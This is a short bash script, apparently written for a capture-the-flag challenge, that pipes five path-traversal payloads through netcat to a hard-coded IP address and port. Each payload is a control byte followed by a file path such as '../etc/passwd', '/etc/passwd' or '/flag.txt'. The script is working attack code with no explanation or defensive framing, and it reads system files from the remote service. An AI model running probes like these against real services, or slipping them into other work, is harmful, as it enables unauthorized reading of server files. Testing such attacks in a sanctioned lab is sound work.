#!/bin/bash
TARGET="94.237.49.23"
PORT="37326"

echo "=== Test Path Traversal 1: ../etc/passwd ==="
echo -ne "\x04../etc/passwd\n" | timeout 5s nc $TARGET $PORT | head -20
echo ""

echo "=== Test Path Traversal 2: ../../etc/passwd ==="
echo -ne "\x04../../etc/passwd\n" | timeout 5s nc $TARGET $PORT | head -20
echo ""

echo "=== Test Path Traversal 3: /etc/passwd ==="
echo -ne "\x04/etc/passwd\n" | timeout 5s nc $TARGET $PORT | head -20
echo ""

echo "=== Test Path Traversal 4: ../flag ==="
echo -ne "\x04../flag\n" | timeout 5s nc $TARGET $PORT | head -20
echo ""

echo "=== Test Path Traversal 5: /flag.txt ==="
echo -ne "\x04/flag.txt\n" | timeout 5s nc $TARGET $PORT | head -20
echo ""